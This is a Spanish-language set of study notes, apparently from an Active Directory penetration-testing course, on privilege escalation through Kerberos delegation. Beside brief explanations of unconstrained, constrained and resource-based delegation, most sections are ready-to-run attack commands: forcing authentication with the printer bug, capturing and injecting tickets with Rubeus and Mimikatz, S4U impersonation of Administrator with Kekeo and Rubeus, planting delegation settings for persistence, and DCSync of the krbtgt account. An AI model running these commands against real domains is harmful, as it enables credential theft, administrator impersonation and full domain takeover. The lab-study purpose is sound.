# Domain Priv. Esc.

**Privilege Escalation – Kerberos Delegation**

Hay dos tipos de delegación de Kerberos:

- Delegación general / básica o sin restricciones que permite el primer salto
servidor (servidor web en nuestro ejemplo) para solicitar acceso a cualquier servicio
en cualquier computadora del dominio.
- Delegación restringida que permite que el servidor de primer salto (servidor web
en nuestro ejemplo) para solicitar acceso solo a servicios especificados en
computadoras especificadas

Privilege Escalation – Unconstrained Delegation

![images/Domain%20Priv%20Esc/Untitled.png](images/Domain%20Priv%20Esc/Untitled.png)

1. Un usuario proporciona credenciales al controlador de dominio.
2. El DC devuelve un TGT.
3. El usuario solicita un TGS para el servicio web en Web Servidor.
4. El DC proporciona un TGS.
5. El usuario envía el TGT y TGS al servidor web.
6. La cuenta de servicio del servidor web utiliza el TGT del usuario para solicite un TGS para el servidor de la base de datos del DC.
7. La cuenta de servicio del servidor web se conecta al servidor de base de datos como usuario.

Cuando se habilita la delegación sin restricciones, DC coloca el TGT del usuario dentro de TGS. Cuando se presenta al servidor con delegación ilimitada, el TGT se extrae de TGS y almacenado en LSASS. De esta forma, el servidor puede reutilizar el TGT del usuario para acceder a cualquier otro recurso como usuario.
* Esto podría usarse para escalar privilegios en caso de que podamos comprometer el computador con delegación ilimitada y un administrador de dominio se conecta a esa máquina.

Para descubrir equipos del dominio sin restricción usar el comando: 

PowerView:

`Get-DomainComputer -UnConstrained`

AD: 

`Get-ADComputer -Filter {TrustedForDelegation -eq $True}` 

`Get-ADUser -Filter {TrustedForDelegation -eq $True}`

 Debemos engañar a un administrador de dominio u otro usuario de alto privilegio para que se conecte a un servicio en us-web. Hay que utilizar Ingenieria Social.
• Después de la conexión, podemos exportar TGT usando el siguiente comando:
`Invoke-Mimikatz –Command '"sekurlsa :: tickets / export"'`
• El billete se puede reutilizar:
`Invoke-Mimikatz –Command '"kerberos :: ptt ticket.kirbi"'`

¿Cómo engañamos a un usuario con muchos privilegios para conectar a una máquina con delegación sin restricciones? El Bug de impresora!
• Una función de MS-RPRN que permite cualquier usuario de dominio (autenticado) puede forzar cualquier máquina (en ejecución el servicio Spooler) para conectarse a una segunda máquina del dominio a elección del usuario.

Usemos MS-RPRN.exe ([https://github.com/leechristensen/SpoolSample](https://github.com/leechristensen/SpoolSample)) en nuestra web

`.\MS-RPRN.exe \\1DOMINIO \\2DOMINIO`

Con Rubeus capturamos el TGT del us-dc :

`.\Rubeus.exe monitor /interval:5`

Se copia el TGT codificado en base64 (se eliminan los espacios) y lo usamos en la maquina atacante:

`.\Rubeus.exe ptt /tikcet:`

O tambien se puede hacer con mimikatz:

`[IO.File]::WriteAllBytes("C:\USDC.kirbi",[Convert]::FromBase64String("ticket_from_Rubeus_monitor")) 
Invoke-Mimikatz -Command '"kerberos::ptt C:\USDC.kirbi"'`

Corremos DCSync:

`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`

Para abusar de la delegación restringida con la transición de protocolo, necesitamos
comprometer la cuenta del servicio web. Si tenemos acceso a esa cuenta, es posible acceder a los servicios enumerados en msDS AllowToDelegateTo de la cuenta del servicio web como CUALQUIER usuario.

Privilege Escalation – Constrained Delegation with Protocol Transition

![images/Domain%20Priv%20Esc/Untitled%201.png](images/Domain%20Priv%20Esc/Untitled%201.png)

1. Un usuario se autentica en el servicio web utilizando un dispositivo que no es Kerberos.
mecanismo de autenticación compatible.
2. El servicio web solicita un ticket al Centro distribución de claves (KDC) para la cuenta del usuario sin proporcionar una contraseña,
como cuenta de servicio web.
3. El KDC comprueba el valor userAccountControl del servicio web para el atributo TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
y la cuenta de ese usuario no está bloqueada para la delegación. Si esta bien devuelve un ticket reenviable para la cuenta del usuario (S4U2Self).
4. El servicio luego devuelve este boleto al KDC y solicita un ticket de servicio para el servicio SQL Server.
5. El KDC comprueba el campo msDS-AllowToDelegateTo en el cuenta de servicio web. Si el servicio aparece en la lista, devolverá un ticket de servicio para MSSQL (S4U2Proxy).
6. El servicio web ahora puede autenticarse en el servidor SQL como el usuario que utiliza el TGS suministrado.

PowerView: `Get-DomainUser –TrustedToAuth` , `Get-DomainComputer –TrustedToAuth`

AD: `Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo`

Usando Kekeo, solicitamos un TGT para la cuenta de servicio del primer salto (podemos
usar una contraseña o hash NTLM):

`tgt::ask /user: /domain: /rc4:`

Otro tema interesante en Kerberos es que la delegación no ocurre solo para el servicio especificado, pero para cualquier servicio que se ejecute bajo la misma cuenta. No hay validación para el SPN especificado.
Esto es grande, ya que permite el acceso a muchos servicios interesantes cuando la delegación puede ser para un servicio no intrusivo

Usando kekeo, hacemos una peticion TGS:

`tgs::s4u /tgt:TGT_USER@DOMINIO_krbtgt~DOMINIO@DOMINIO.kirbi /user:Administrator /service:CIFS/DOMINIO|HTTP/DOMINIO`

Usando mimikatz:

`Invoke-Mimikatz '"kerberos::ptt TGS_Administrator@DOMINIO_HTTP~usmssql.DOMINIO@DOMINIO.kirbi"'`

`Invoke-Command -ScriptBlock{whoami} -ComputerName usmssql.DOMINIO`

Usando Rubeus:

`Rubeus.exe s4u /user:
/rc4:
/impersonateuser:administrator /msdsspn:CIFS/usmssql.DOMINIO /altservice:HTTP
/domain: /ptt`

`winrs -r:us- cmd.exe`

Persistence - msDS-AllowedToDelegateTo

- Tenga en cuenta que msDS-AllowToDelegateTo es la marca de la cuenta de usuario que
controla los servicios a los que tiene acceso una cuenta de usuario.
- Esto significa que, con suficientes privilegios, es posible acceder a cualquier servicio
de un usuario: un buen truco de persistencia.
- ¿Suficientes privilegios? - SeEnableDelegationPrivilege en el DC y completo
derechos en el usuario de destino: predeterminado para administradores de dominio y empresas Administradores.
- Es decir, podemos forzar el conjunto 'De confianza para autenticar para delegación' y
ms-DS-allowedToDelegateTo en un usuario (o crear un nuevo usuario, que es
más ruidoso) y abusar de él más tarde.

Usando PowerView:

`Set-DomainObject -Identity USER -Set @{serviceprincipalname='dev/svc'}
Set-DomainObject -Identity USER -Set @{"msds-allowedtodelegateto"="ldap/DOMINIO"}
Set-DomainObject -SamAccountName devuser1 -Xor @{"useraccountcontrol"="16777216"}
Get-DomainUser –TrustedToAuth`

Usando AD:

`Set-ADUser -Identity devuser -ServicePrincipalNames @{Add='dev/svc'} 
Set-ADUser -Identity devuser -Add @{'msDS-AllowedToDelegateTo'= @('ldap/usdc'
,
'ldap/DOMINIO')} -Verbose 
Set-ADAccountControl -Identity devuser -TrustedToAuthForDelegation $true 
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"} -Properties msDSAllowedToDelegateTo`

Usando kekeo:

`kekeo# tgt::ask /user: /domain:
/password:Password@123!`
`kekeo# tgs::s4u
/tgt:TGT_USER@DOMINIO_krbtgt~DOMINIO@DOMINIO.kirbi /user:Administrator@us.techcorp.local
/service:ldap/DOMINIO`
`Invoke-Mimikatz -Command '"kerberos::ptt
TGS_Administrator@DOMINIO@DOMINIO_ldap~DOMINIO@DOMINIO.kirbi"'`
`Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'`

Usando Rubeus:

`Rubeus.exe hash /password:Password@123! /user: /domain:`

`Rubeus.exe s4u /user: /rc4: /impersonateuser:administrator /msdsspn:ldap/ /domain: /ptt`

`C:\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"`

Privilege Escalation – Resource-based Constrained Delegation

- Esto traslada la autoridad de delegación al administrador de recursos / servicios.
- En lugar de SPN en msDs-allowedToDelegatTo en el servicio de front-end como el servicio web, el acceso en este caso está controlado por el descriptor de seguridad de msDS AllowToActOnBehalfOfOtherIdentity (visible como
PrincipalsAllowedToDelegateToAccount) en el recurso / servicio como el servicio SQL Server.
- Es decir, el administrador de recursos / servicios puede configurar esta delegación, mientras que para otros tipos, se requieren privilegios SeEnableDelegation que, de forma predeterminada, están disponibles solo para administradores de dominio.
- Para abusar de RBCD de la forma más eficaz, solo necesitamos dos privilegios.
- Uno, control sobre un objeto que tiene SPN configurado (como admin
acceso a una máquina unida a un dominio o capacidad para unirse a una máquina para
dominio: ms-DS-MachineAccountQuota es 10 para todos los usuarios del dominio)
- Dos, permisos de escritura sobre el servicio u objeto de destino para configurar
msDS-AllowToActOnBehalfOfOtherIdentity.
- Ya tenemos acceso a una máquina unida a un dominio.
- Vamos a enumerar si tenemos permisos de escritura sobre cualquier objeto.

PowerView: `Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'username'}`

AD(configurar RBCD para maquinas de estudiantes): `$comps = 'username'
Set-ADComputer -Identity pcname -PrincipalsAllowedToDelegateToAccount $comps`

Ahora, obtengamos los privilegios de user extrayendo sus claves ES:

`Invoke-Mimikatz -Command '"sekurlsa::ekeys"'`

Use la clave AES de user $ con Rubeus y acceda a pcname como CUALQUIER usuario que queramos: `.\Rubeus.exe s4u /user: /aes256: /msdsspn:http/pcname /impersonateuser:administrator /ptt`
